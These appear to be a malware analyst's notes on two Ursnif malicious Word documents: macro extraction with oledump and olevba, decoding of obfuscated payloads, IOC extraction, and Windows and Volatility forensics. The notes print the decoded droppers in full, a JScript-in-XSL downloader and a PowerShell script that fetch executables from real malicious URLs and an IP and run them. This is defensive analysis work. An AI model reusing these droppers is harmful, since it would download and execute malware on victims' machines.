Reference 

https://www.malware-traffic-analysis.net/2019/08/21/index.html

  ---> https://www.malware-traffic-analysis.net/2019/08/21/2019-08-21-two-recent-examples-of-Urnsif-malspam.zip
===================================================================================================================
Use frack to crack the password protected file using fcrackzip software 

# fcrackzip -u -D  -p Passwordlist/rockyou.txt Samples/MTA-sample/MRIS.zip 

PASSWORD FOUND!!!!: pw == xxx
===================================================================================================================

$ unzip -P xxx MRIS.zip

Archive:  MRIS.zip
  inflating: info_08.15.doc
 =================================================================================================================== 
  OfficeMalScanner>OfficeMalScanner.exe ..\..\info_08.15.doc info

+------------------------------------------+
|           OfficeMalScanner v0.61         |
|  Frank Boldewin / www.reconstructer.org  |
+------------------------------------------+

[*] INFO mode selected
[*] Opening file ..\..\info_08.15.doc
[*] Filesize is 107520 (0x1a400) Bytes
[*] Ms Office OLE2 Compound Format document detected
[*] Format type Winword

-----------------------------------------
[Scanning for VB-code in INFO_08.15.DOC]
-----------------------------------------
a8q6cA
aKVwYGaC
alJ6CoiF
aElSGoL2t
ThisDocument
-----------------------------------------------------------------------------
                VB-MACRO CODE WAS FOUND INSIDE THIS FILE!
               The decompressed Macro code was stored here:

------> C:\Users\Jones\Desktop\Tools\OfficeMalScanner\INFO_08.15.DOC-Macros
-----------------------------------------------------------------------------
===================================================================================================================  
  $ ../../oledump/oledump.py info_08.15.doc 
 1:      114 '\x01CompObj'
 2:     4096 '\x05DocumentSummaryInformation'
 3:     4096 '\x05SummaryInformation'
 4:     7635 '1Table'
 5:    33392 'Data'
 6:      598 'Macros/PROJECT'
 7:      146 'Macros/PROJECTwm'
 8: M   2373 'Macros/VBA/ThisDocument'
 9:     6621 'Macros/VBA/_VBA_PROJECT'
10:     2453 'Macros/VBA/__SRP_0'
11:      206 'Macros/VBA/__SRP_1'
12:      532 'Macros/VBA/__SRP_2'
13:      156 'Macros/VBA/__SRP_3'
14: M   7831 'Macros/VBA/a8q6cA'
15: M   3038 'Macros/VBA/aElSGoL2t'
16: M  13888 'Macros/VBA/aKVwYGaC'
17: M   2905 'Macros/VBA/alJ6CoiF'
18:     1120 'Macros/VBA/dir'
19:       97 'Macros/aElSGoL2t/\x01CompObj'
20:      292 'Macros/aElSGoL2t/\x03VBFrame'
21:       90 'Macros/aElSGoL2t/f'
22:     1780 'Macros/aElSGoL2t/o'
23:      306 'MsoDataStore/\xc3\x80\xc3\x96PL\xc3\x93VU\xc3\x8a\xc3\x9e\xc3\x94\xc3\x9a\xc3\x99\xc3\x9cW\xc3\x82\xc3\x8e\xc3\x90\xc3\x90\xc3\x9f\xc3\x84\xc3\x9eQ==/Item'
24:      341 'MsoDataStore/\xc3\x80\xc3\x96PL\xc3\x93VU\xc3\x8a\xc3\x9e\xc3\x94\xc3\x9a\xc3\x99\xc3\x9cW\xc3\x82\xc3\x8e\xc3\x90\xc3\x90\xc3\x9f\xc3\x84\xc3\x9eQ==/Properties'
25:     4096 'WordDocument'
===================================================================================================================
Mybash$ ../../oledump/oledump.py -v -s 8 info_08.15.doc 
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
....
===================================================================================================================
Mybash$ ../../oledump/oledump.py -v -s 14 info_08.15.doc 
Attribute VB_Name = "a8q6cA"
Function ayrlTQ(aG1m35a As String) As String
Dim aTGpk0Y
aTGpk0Y = Hex(165)
Dim a2680s
For a2680s = 61 To 64
Debug.Print Error(a2680s)
Next a2680s
' Removable walk
....

===================================================================================================================

Mybash$ ../../oledump/oledump.py -v -s 15 info_08.15.doc 
Attribute VB_Name = "aElSGoL2t"
Attribute VB_Base = "0{657D5972-E32F-4949-A505-D3437332305D}{A9C0A898-BFAB-49EF-A912-B6E8270197DC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
End Function
.....
===========================================================================================================
olevba.py 

mymac$../../oledump/oletools-0.46/oletools/olevba.py info_08.15.doc 
olevba 0.46 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIHB-- info_08.15.doc
===============================================================================
FILE: info_08.15.doc
Type: OLE


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-------------------------------------------------------------------------------
      VBA FORM STRING IN 'info_08.15.doc' - OLE stream: u'Macros/aElSGoL2t/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://google.com/namespace">
	<msxsl:script language="JScript" implements-prefix="user">
	<![CDATA[

		function aCNIy(adOVc)
		{
			var a6SZB = [
							"http://mgregyoherminio.com/qtra/ttqr.php?l=geus6.j12",
							"wscript.sh" + "ell",
							"scripting.file" + "systemobject",
							"msxml2.xmlhttp",
							"sav" + "etofile",
							"r" + "un",
							"deletefile",
							"c:\\win" + "dows\\temp\\aKMYfn.exe",
						];

			return(a6SZB[adOVc]);
		}

	]]>
	</msxsl:script>
	<msxsl:script language="JScript" implements-prefix="user">
	<![CDATA[

		// url
		var agWEApk = aCNIy(0);

		// wscript.shell
		var aSBaMCj2 = new ActiveXObject(aCNIy(1));

		// scripting.filesystemobject
		var a5hcknwB = new ActiveXObject(aCNIy(2));

	]]>
	</msxsl:script>
	<msxsl:script language="JScript" implements-prefix="user">
	<![CDATA[

		function aGhsTVX9(adOVc)
		{
			// msxml2.xmlhttp
			var aHfawByp = new ActiveXObject(aCNIy(3));

			aHfawByp.open("GET", agWEApk, 0);
			aHfawByp.send();

			if(aHfawByp.status === 200 && aHfawByp.readystate === 4)
			{
				var aLH15r = new ActiveXObject("adodb.stream");
				aLH15r.open();
				aLH15r.type = 1;
				aLH15r.write(aHfawByp.responsebody);
				aLH15r.position = 0;
				aLH15r[aCNIy(4)](aCNIy(7), 2);
				aLH15r.close();

				aSBaMCj2[aCNIy(5)](aCNIy(7));

				// Self delete
				a5hcknwB[aCNIy(6)]("arJzRsLeT.xsl.xsl");
			}
		}

	]]>
	</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:aGhsTVX9('')"/>
</xsl:template>
</xsl:stylesheet>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'info_08.15.doc' - OLE stream: u'Macros/aElSGoL2t/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | Document_Open        | Runs when the Word document is opened   |
| Suspicious | Open                 | May open a file                         |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | WScript.Shell        | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | Run                  | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | Chr                  | May attempt to obfuscate specific       |
|            |                      | strings                                 |
| Suspicious | ADODB.Stream         | May create a text file                  |
| Suspicious | Write                | May write to a file (if combined with   |
|            |                      | Open)                                   |
| Suspicious | Output               | May write to a file (if combined with   |
|            |                      | Open)                                   |
| Suspicious | Print #              | May write to a file (if combined with   |
|            |                      | Open)                                   |
| Suspicious | Msxml2.XMLHTTP       | May download files from the Internet    |
| Suspicious | Windows              | May enumerate application windows (if   |
|            |                      | combined with Shell.Application object) |
|            |                      | (obfuscation: Hex)                      |
| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
|            |                      | be used to obfuscate strings (option    |
|            |                      | --decode to see all)                    |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| IOC        | http://www.w3.org/19 | URL                                     |
|            | 99/XSL/Transform     |                                         |
| IOC        | http://google.com/na | URL                                     |
|            | mespace              |                                         |
| IOC        | http://mgregyohermin | URL                                     |
|            | io.com/qtra/ttqr.php |                                         |
|            | ?l=geus6.j12         |                                         |
| IOC        | aKMYfn.exe           | Executable file name                    |
| Hex String | c:\Windows\System32\ | 633a5c57696e646f77735c53797374656d33325 |
|            | wbem\wmic process    | c7762656d5c776d69632070726f63657373206c |
|            | list /format:"arJzRs | 697374202f666f726d61743a2261724a7a52734 |
|            | LeT.xsl"             | c65542e78736c22                         |
| Hex String | e}Yr                 | 657D5972                                |
+------------+----------------------+-----------------------------------------+

c:\Windows\System32\wbem\wmic process list /format:"arJzRsLeT.xsl"   


=================================================================================================

You can use windbg to monitor the VB Macro execution

Attach the winword.exe process to windbg
bp CreateProcessW
g
du poi(esp+4)
du poi(esp+8)

until you get the final output of the macro code execution 

====================================================================================================

			URSNIF mal doc analysis and IOC extraction using following tools
			MD5 (../ursnif.doc) = 209b1c2b0d1028456145ac1093dc1dec
			https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html

Python script

oledump.py --> oledump_V0_0_39
base64dump.py --> wget http://didierstevens.com/files/software/base64dump_V0_0_11.zip
translate.py --> wget https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/translate.py
plugin --> plugin_stream_o.py
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

oledump tisocd$ python oledump.py ../ursnif.doc 

  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7115 '1Table'
  5:     33394 'Data'
  6:       478 'Macros/PROJECT'
  7:        62 'Macros/PROJECTwm'
  8: M    1472 'Macros/VBA/ThisDocument'
  9:      3186 'Macros/VBA/_VBA_PROJECT'
 10:       819 'Macros/VBA/dir'
 11: m    1179 'Macros/VBA/ymwsrw'
 12:        97 'Macros/ymwsrw/\x01CompObj'
 13:       288 'Macros/ymwsrw/\x03VBFrame'
 14:       174 'Macros/ymwsrw/f'
 15:      2336 'Macros/ymwsrw/o'
 16:       306 'MsoDataStore/\xc3\x86\xc3\x97\xc3\x8b2\xc3\x88TPX3\xc3\x94W\xc3\x94\xc3\x8eI\xc3\x91\xc3\x82\xc3\x8e\xc3\x9e\xc3\x85YK\xc3\x90==/Item'
 17:       341 'MsoDataStore/\xc3\x86\xc3\x97\xc3\x8b2\xc3\x88TPX3\xc3\x94W\xc3\x94\xc3\x8eI\xc3\x91\xc3\x82\xc3\x8e\xc3\x9e\xc3\x85YK\xc3\x90==/Properties'
 18:      4096 'WordDocument'
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 Stream 12-15 contains forms properties ending with /o
 
 Look into the stream 15 which has 2336 byte size
 
 $ python oledump.py -s 15 ../ursnif.doc 
 
00000000: 00 02 58 08 01 01 40 80  00 00 00 00 1B 48 80 2C  ..X...@......H.,
00000010: 40 08 00 80 EC 09 00 00  7B 02 00 00 49 41 41 6F  @.......{...IAAo
00000020: 41 43 41 41 4C 67 41 6F  41 43 63 41 62 67 42 46  ACAALgAoACcAbgBF
00000030: 41 48 63 41 4A 77 41 72  41 43 63 41 4C 51 42 50  AHcAJwArACcALQBP
00000040: 41 45 49 41 4A 77 41 72  41 43 63 41 61 67 41 6E  AEIAJwArACcAagAn
00000050: 41 43 73 41 4A 77 42 6C  41 47 4D 41 64 41 41 6E  ACsAJwBlAGMAdAAn
00000060: 41 43 6B 41 49 41 41 67  41 46 4D 41 57 51 42 54  ACkAIAAgAFMAWQBT


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 Upon using the plugin stream
 
  python oledump.py -p plugin_stream_o ../ursnif.doc 
  
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7115 '1Table'
  5:     33394 'Data'
  6:       478 'Macros/PROJECT'
  7:        62 'Macros/PROJECTwm'
  8: M    1472 'Macros/VBA/ThisDocument'
  9:      3186 'Macros/VBA/_VBA_PROJECT'
 10:       819 'Macros/VBA/dir'
 11: m    1179 'Macros/VBA/ymwsrw'
 12:        97 'Macros/ymwsrw/\x01CompObj'
 13:       288 'Macros/ymwsrw/\x03VBFrame'
 14:       174 'Macros/ymwsrw/f'
 15:      2336 'Macros/ymwsrw/o'
               Plugin: UserForm /o plugin 
                 IAAoACAALgAoACcAbgBFAHcAJwArACcALQBPAEIAJwArACcAagAnACsAJwBlAGMAdAAnACkAIAAgAFMAWQBTAFQAYAB
		 lAG0AYAAuAGkAbwBgAC4AQwBPAE0AUABSAGAARQBgAHMAUwBpAE8AYABOAC4AZABlAGYAbABBAFQAZQBgAFMAVABSAE
		 UAQQBtACgAWwBzAHkAUwB0AGUAbQAuAEkATwAuAE0ARQBNAE8AcgBZAHMAdAByAGUAQQBtAF0AWwBzAFkAUwBUAGUATQ
		 AuAEMATwBOAFYAZQByAFQAXQA6ADoARgBSAG8ATQBCAGEAcwBlADYANABzAHQAcgBpAG4ARwAoACcAVABaAEQAZABUADQA
		 TQB3AEYATQBYAGYAVABmAHcAZgArAG8AQQBwAFoASwA2ADQAagAyAHcAQwBJAGMAYQBNAFoAUwBFAHUAYgBOAG0ASABtAE
		 sAagBKAFcA

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Now we can use base64dump to decode the encoded string. Filter the string with greater than 20 bytes. As you can see stream 11 
contains greater the 20 bytes also starts with the powershell encoded strings

$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py 

ID  Size    Encoded          Decoded          MD5 decoded                     
--  ----    -------          -------          -----------                     
 1:       4 4096             ?Oz              fc2bdc3ec732a8dfb3c85dc95fb8fbb7
 2:       4 4096             ?Oz              fc2bdc3ec732a8dfb3c85dc95fb8fbb7
 3:       4 7115             ?]y              0f0577f7f7f372498bffc336439a6a19
 4:       4 Data             .?Z              46f0f52cf17af28bc6acb964533500fc
 5:      16 Macros/PROJECTwm 1?+???D?D.<&     a7e5ac3cf518604f33df8e1840c9932a
 6:       4 1472             ׎?              d2eb82eab07b3ed5033a329b4308ec3a
 7:       4 3186             ?_:              9b55140d319c9b99d9a665a33e77d3b5
 8:       4 1179             ?^?              ca08f43227f00f92d76b382929d35703
 9:       4 2336             ?}?              e4535fc93d75206cbcfd6be2838fde0a
10:       8 UserForm         Rǫ.??           a93bcec7124c78a1f2601aceb839ca3e
11:    2112 IAAoACAALgAoACcA  .(. ...(.'.n.E. 6c10d34554df7015670818b6d4daf9e3
12:       8 72C24DD5         ?`??0?           c684d85d66708ad4e19a4d470a718101

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20
ID  Size    Encoded          Decoded          MD5 decoded                     
--  ----    -------          -------          -----------                     
 1:    2112 IAAoACAALgAoACcA  .(. ...(.'.n.E. 6c10d34554df7015670818b6d4daf9e3
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 Selecting the stream one from above and perform ascii dump
 
 $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -a
 
00000000: 20 00 28 00 20 00 2E 00  28 00 27 00 6E 00 45 00   .(. ...(.'.n.E.
00000010: 77 00 27 00 2B 00 27 00  2D 00 4F 00 42 00 27 00  w.'.+.'.-.O.B.'.
00000020: 2B 00 27 00 6A 00 27 00  2B 00 27 00 65 00 63 00  +.'.j.'.+.'.e.c.
00000030: 74 00 27 00 29 00 20 00  20 00 53 00 59 00 53 00  t.'.). . .S.Y.S.
00000040: 54 00 60 00 65 00 6D 00  60 00 2E 00 69 00 6F 00  T.`.e.m.`...i.o.
00000050: 60 00 2E 00 43 00 4F 00  4D 00 50 00 52 00 60 00  `...C.O.M.P.R.`.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Remove the dots by converting the asscii to utf16

$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16

 ( .('nEw'+'-OB'+'j'+'ect')  SYST`em`.io`.COMPR`E`sSiO`N.deflATe`STREAm([syStem.IO.MEMOrYstreAm][sYSTeM.CONVerT]::
 FRoMBase64strinG('TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
 UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLKUxdZ2If9rplyhnFAcI
 81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgRO6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFG
 gZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXV
 Nw==') ,[sYsTem.io.cOMpReSsiON.CompressIONMODE]::DECompreSS )|&('f'+'ore'+'acH'){ &('NEW-ob'+'J'+'EcT') 
 i`o.`S`TreamREADER($_,[sySTem.TExT.ENcodInG]::asCii) }|.('ForEa'+'C'+'H'){$_.readtoend() } ) |.('I'+'E' + 'X')

Compressed base64 encoded strings

TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
 UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLKUxdZ2If9rplyhnFAcI
 81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgRO6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFG
 gZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXV
 Nw==
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
PIPE the above base64 to base64dump

 python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py 
 
ID  Size    Encoded          Decoded          MD5 decoded                     
--  ----    -------          -------          -----------                     
 1:       4 SYST             I??              b84f1d3fb14c5a1307a188b8e4732131
 2:       4 sSiO             ?(?              330cdd935f91947fb47c8a2cb1925adc
 3:      12 MEMOrYstreAm     0C.??-??&        5e4cec61ea2be09a6561fe98c573f1e2
 4:      16 FRoMBase64strinG ....?.?-?)?     6e21956a4962ee3d48600b4b3623e73e
 5:     448 TZDdT4MwFMXfTfwf M??O?0.??M?.??)d 5c06b33437f0739de1a4c8ee277e3caa
 6:       4 TExT             LLS              090084d1ca90cec9865c7ecf79cca12d
 7:       8 ENcodInG         .?(t??           486dd5e82b48868be7b5aa87ad187c7a
 
 Stream 5 starts with the base64 strings
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 > 40 btyes
 
 $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py -n 40
 
ID  Size    Encoded          Decoded          MD5 decoded                     
--  ----    -------          -------          -----------                     
 1:     448 TZDdT4MwFMXfTfwf M??O?0.??M?.??)d 5c06b33437f0739de1a4c8ee277e3caa
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py -n 40 -s 1 -a

00000000: 4D 90 DD 4F 83 30 14 C5  DF 4D FC 1F FA 80 29 64  M..O.0...M...?)d
00000010: AE B8 8F 6C 02 21 C6 8C  65 21 2E 6C D9 87 98 A8  ...l.!..e!.l....
00000020: C9 58 2D D0 0D DA 0A DD  18 12 FE 77 31 D9 D4 97  .X-........w1...
00000030: 7B EF C3 39 27 E7 77 15  B7 74 45 F0 B4 04 36 80  {..9'.w..tE...6?
00000040: 38 65 9F CF 47 68 29 6B  51 08 DF B7 15 C2 8E E6  8e..Gh)kQ.......
00000050: 21 27 99 C8 78 48 13 D2  82 6F B0 A5 9C 0D 2D 88  !'..xH...o....-.
00000060: C8 89 34 62 DE 0F 8D F5  87 8D 54 C8 60 0B 92 A2  ..4b......T.`...
00000070: CD 9B B5 DD 11 2C A1 06  3C B2 59 6D 90 4F B6 9B  .....,..<.Ym.O..
00000080: D1 94 12 6F 65 29 C7 C3  C2 99 3D 7E 8D 6C 18 4B  ...oe)....=~.l.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | 
./base64dump.py -n 40 -s 1 -a -d | ./translate.py -f ZlibRawD

$IyIpaKS = 'cmnqVv';$UpwpWW=$env:userprofile+'\'+$IyIpaKS+'.exe';$o4f9Ud=.('n'+'ew-o'+'bject') Ne`T`.Web`CLieNT;
$vuRDOAzC='http://npkf32ymonica.com/sywo/fgoow.php?l=joow8.gxl'.split('%');
foreach($IPpm4NiW in $vuRDOAzC){try{$o4f9Ud.DowNloaDfIlE($IPpm4NiW, $UpwpWW);
If ((.('Get-I'+'te'+'m') $UpwpWW).lENGth -ge 2977) {[Diagnostics.Process]::STaRt($UpwpWW);break;}}catch{}}; 
IEX($o4f9Ud.DownLOaDStrIng('http://109[.]196.164.79/3.php'));

 Finally the above IOC has been extracted using translate.py 
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 Alternate solution use cyber chef with 
 
 From base64 --> Raw Inflate (Adaptive)
 
 Input
 
 TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLK
UxdZ2If9rplyhnFAcI81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgR
O6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFGgZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/
VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXVNw==
 
 $IyIpaKS = 'cmnqVv';$UpwpWW=$env:userprofile+'\'+$IyIpaKS+'.exe';$o4f9Ud=.('n'+'ew-o'+'bject') 
 Ne`T`.Web`CLieNT;$vuRDOAzC='http://npkf32ymonica.com/sywo/fgoow.php?l=joow8.gxl'.split('%');
 foreach($IPpm4NiW in $vuRDOAzC){try{$o4f9Ud.DowNloaDfIlE($IPpm4NiW, $UpwpWW);If ((.('Get-I'+'te'+'m')
 $UpwpWW).lENGth -ge 2977) {[Diagnostics.Process]::STaRt($UpwpWW);break;}}catch{}};
 IEX($o4f9Ud.DownLOaDStrIng('http://109[.]196.164.79/3.php'));

============================================================================================================

				Windows Forensics Artifacts extract and basic analysis
				
* Use FTK imager to extract the protected file from local system
* Use Registry viewer to view the artifacts of office document execution from path 
		NTUSER.dat\Software\Microsoft\Office\14.0\Word\Resillency\DocumentsRecovery
		Look for powershell execution in event ID 
		
PowerShell command history
Where to find it
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
What you can find
By default, in Windows 10, the last 4096 typed commands. The history is stored separately for PowerShell and ISE.
Further reading
This capability was introduced in the PowerShell v5, in Windows 10. It is based on the third party module PSReadLine, which is not included in the separately installed PowerShell 5 for previous versions of Windows.
References
http://woshub.com/powershell-commands-history/
https://blog.illusivenetworks.com/tech/windows-console-command-history-live-response-investigation
Script block logging
Where to find it
Event log: Microsoft-Windows-PowerShell/Operational. 
What you can find 
Event ID: 4104. Script blocks. If a script block creates another script block (for example, a script that calls the Invoke-Expression cmdlet on a string), that resulting script block is logged as well. Due to the nature of script block logging, it also records de-obfuscated code as it is executed. 
Event ID: 4100. Error messages when the script did not run properly.
Event ID: 4103. Module logging.
Event ID: 4105 and 4106.  Script block execution start and stop events. They are quite noisy and not recommended in most of the environments.

Memory Analysis 

Extract the memory dump using FTK memory extraction 

  620  vol.py --info
  622  vol.py imageinfo -f memdump.mem 
  623  vol.py --profile=Win7SP1x64 -f memdump.mem ps
  624  vol.py --profile=Win7SP1x64 -f memdump.mem pslist
  625  vol.py --profile=Win7SP1x64 -f memdump.mem pstree
  626  vol.py --profile=Win7SP1x64 -f memdump.mem psxview
  627  vol.py --profile=Win7SP1x64 -f memdump.mem connscan
  628  vol.py --profile=Win7SP1x64 -f memdump.mem netconn
  629  vol.py --profile=Win7SP1x64 -f memdump.mem netscan
  630  vol.py --profile=Win7SP1x64 -f memdump.mem cmdline
  631  vol.py --profile=Win7SP1x64 -f memdump.mem pstree
  632  vol.py --profile=Win7SP1x64 -f memdump.mem procdump -p 1652 --dump-dir .
  635  vol.py --profile=Win7SP1x64 -f memdump.mem memdump -p 1652 --dump-dir .
  
  641  strings  1652.dmp | grep -Fi "109.196.164.79" -C 5
  642  strings  1652.dmp | grep -Fi ".com" -C 5
  643  strings  1652.dmp | grep -Fi ".com" -C 5 | less
  644  strings  1652.dmp | grep -Fi "npkf3" -C 
  645  strings  1652.dmp | grep -Fi "npkf3" -C 5

# What type of dump am I going to analyze ?
$ volatility -f MyDump.dmp imageinfo

# Which process are running
$ volatility -f MyDump.dmp --profile=MyProfile pslist
$ volatility -f MyDump.dmp --profile=MyProfile pstree
$ volatility -f MyDump.dmp --profile=MyProfile psxview

# List open TCP/UDP connections
$ volatility -f MyDump.dmp --profile=MyProfile connscan
$ volatility -f MyDump.dmp --profile=MyProfile sockets
$ volatility -f MyDump.dmp --profile=MyProfile netscan

# What commands were lastly run on the computer
$ volatility -f MyDump.dmp --profile=MyProfile cmdline
$ volatility -f MyDump.dmp --profile=MyProfile consoles
$ volatility -f MyDump.dmp --profile=MyProfile cmdscan

# Dump processes exe and memory 
$ volatility -f MyDump.dmp --profile=MyProfile procdump -p MyPid --dump-dir .
$ volatility -f MyDump.dmp --profile=MyProfile memdump -p MyPid --dump-dir .

# Hive and Registry key values
$ volatility -f MyDump.dmp --profile=MyProfile hivelist
$ volatility -f MyDump.dmp --profile=MyProfile printkey -K "MyPath"

https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
